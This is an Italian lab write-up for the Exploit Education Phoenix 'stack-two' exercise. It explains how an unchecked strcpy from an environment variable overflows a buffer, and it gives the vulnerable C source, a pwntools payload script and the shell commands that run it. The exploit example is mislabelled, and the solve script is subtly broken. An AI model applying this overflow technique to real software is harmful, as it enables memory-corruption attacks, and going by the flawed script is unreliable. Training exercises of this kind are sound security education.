### Descrizione del Codice

Il programma `stack_two.c` presenta una vulnerabilità di overflow del buffer che può essere sfruttata per sovrascrivere variabili in memoria utilizzando variabili d'ambiente.

### Funzionamento del Programma

1. Il programma legge il valore della variabile d'ambiente `ExploitEducation` e lo memorizza in `ptr`.
2. Se `ptr` è NULL, il programma termina con un messaggio di errore.
3. Il programma inizializza `changeme` a 0 e copia il contenuto di `ptr` in `buffer` utilizzando la funzione `strcpy`.
4. La funzione `strcpy` non controlla la lunghezza dell'input, il che può causare un overflow del buffer.
5. La funzione `main` verifica se la variabile `changeme` è stata impostata al valore specifico `0x0d0a090a`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `strcpy` senza controllare la lunghezza dell'input, il che può causare un overflow del buffer. Questo può essere sfruttato per sovrascrivere la variabile `changeme` con un valore specifico.

### Exploit

L'exploit sfrutta l'overflow del buffer per sovrascrivere la variabile `changeme` con il valore `0x0d0a090a`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}

Questo livello è identico al precedente, tranne che dobbiamo inserire l'exploit nella variabile d'ambiente ExploitEducation.

Soluzione:
# solve.py

from pwn import *

buff = ""
buff += 'A'*64
buff += p64(0x0d0a090a)

print(buff)


Eseguiamo lo script e impostiamo la variabile d'ambiente:
$ export ExploitEducation=$(python solve.py)
$ /opt/phoenix/amd64/stack-two